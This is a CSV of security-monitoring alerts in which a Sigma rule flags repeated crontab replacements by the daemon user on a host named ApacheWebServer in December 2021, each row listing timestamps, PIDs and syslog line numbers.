Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:20,T1053.003,timestamp_utc=2021-12-08 10:02:20; timestamp=Dec  8 10:02:20; host=ApacheWebServer; process=crontab; pid=12525; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=629,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:04,T1053.003,timestamp_utc=2021-12-08 15:02:04; timestamp=Dec  8 15:02:04; host=ApacheWebServer; process=crontab; pid=24508; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1295,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24513; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1297,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24518; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1299,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:05,T1053.003,timestamp_utc=2021-12-08 15:02:05; timestamp=Dec  8 15:02:05; host=ApacheWebServer; process=crontab; pid=24522; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1301,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24525; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1303,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24532; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1305,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24537; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1307,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24541; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1309,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24544; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1311,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24547; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1313,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24550; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1315,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24553; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1317,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24556; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1319,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24559; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1321,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24563; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1323,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24566; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1325,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24569; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1327,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24572; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1329,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:09,T1053.003,timestamp_utc=2021-12-08 15:02:09; timestamp=Dec  8 15:02:09; host=ApacheWebServer; process=crontab; pid=24575; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1331,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24578; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1333,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24581; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1335,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:10,T1053.003,timestamp_utc=2021-12-08 15:02:10; timestamp=Dec  8 15:02:10; host=ApacheWebServer; process=crontab; pid=24584; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1337,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24587; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1339,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24590; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1341,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24593; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1343,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:11,T1053.003,timestamp_utc=2021-12-08 15:02:11; timestamp=Dec  8 15:02:11; host=ApacheWebServer; process=crontab; pid=24596; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1345,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24599; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1347,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24602; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1349,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24605; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1351,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:12,T1053.003,timestamp_utc=2021-12-08 15:02:12; timestamp=Dec  8 15:02:12; host=ApacheWebServer; process=crontab; pid=24608; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1353,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:13,T1053.003,timestamp_utc=2021-12-08 15:02:13; timestamp=Dec  8 15:02:13; host=ApacheWebServer; process=crontab; pid=24611; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1355,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:13,T1053.003,timestamp_utc=2021-12-08 15:02:13; timestamp=Dec  8 15:02:13; host=ApacheWebServer; process=crontab; pid=24628; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1357,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:14,T1053.003,timestamp_utc=2021-12-08 15:02:14; timestamp=Dec  8 15:02:14; host=ApacheWebServer; process=crontab; pid=24631; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1359,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24642; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1361,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24645; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1363,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24649; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1365,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:15,T1053.003,timestamp_utc=2021-12-08 15:02:15; timestamp=Dec  8 15:02:15; host=ApacheWebServer; process=crontab; pid=24652; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1367,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24655; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1369,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24659; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1371,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:16,T1053.003,timestamp_utc=2021-12-08 15:02:16; timestamp=Dec  8 15:02:16; host=ApacheWebServer; process=crontab; pid=24663; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1373,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:17,T1053.003,timestamp_utc=2021-12-08 15:02:17; timestamp=Dec  8 15:02:17; host=ApacheWebServer; process=crontab; pid=24667; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1375,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:17,T1053.003,timestamp_utc=2021-12-08 15:02:17; timestamp=Dec  8 15:02:17; host=ApacheWebServer; process=crontab; pid=24672; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1377,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24679; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1379,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24685; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1381,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:18,T1053.003,timestamp_utc=2021-12-08 15:02:18; timestamp=Dec  8 15:02:18; host=ApacheWebServer; process=crontab; pid=24690; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1383,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24695; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1385,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24698; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1387,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:19,T1053.003,timestamp_utc=2021-12-08 15:02:19; timestamp=Dec  8 15:02:19; host=ApacheWebServer; process=crontab; pid=24702; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1389,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:20,T1053.003,timestamp_utc=2021-12-08 15:02:20; timestamp=Dec  8 15:02:20; host=ApacheWebServer; process=crontab; pid=24706; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1391,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:02:21,T1053.003,timestamp_utc=2021-12-08 15:02:21; timestamp=Dec  8 15:02:21; host=ApacheWebServer; process=crontab; pid=24713; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1394,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:56,T1053.003,timestamp_utc=2021-12-08 15:58:56; timestamp=Dec  8 15:58:56; host=ApacheWebServer; process=crontab; pid=28430; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1479,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:57,T1053.003,timestamp_utc=2021-12-08 15:58:57; timestamp=Dec  8 15:58:57; host=ApacheWebServer; process=crontab; pid=28435; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1481,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:57,T1053.003,timestamp_utc=2021-12-08 15:58:57; timestamp=Dec  8 15:58:57; host=ApacheWebServer; process=crontab; pid=28449; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1483,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:58,T1053.003,timestamp_utc=2021-12-08 15:58:58; timestamp=Dec  8 15:58:58; host=ApacheWebServer; process=crontab; pid=28456; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1485,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:58,T1053.003,timestamp_utc=2021-12-08 15:58:58; timestamp=Dec  8 15:58:58; host=ApacheWebServer; process=crontab; pid=28466; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1487,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28473; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1489,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28478; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1491,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 15:58:59,T1053.003,timestamp_utc=2021-12-08 15:58:59; timestamp=Dec  8 15:58:59; host=ApacheWebServer; process=crontab; pid=28482; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=1493,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
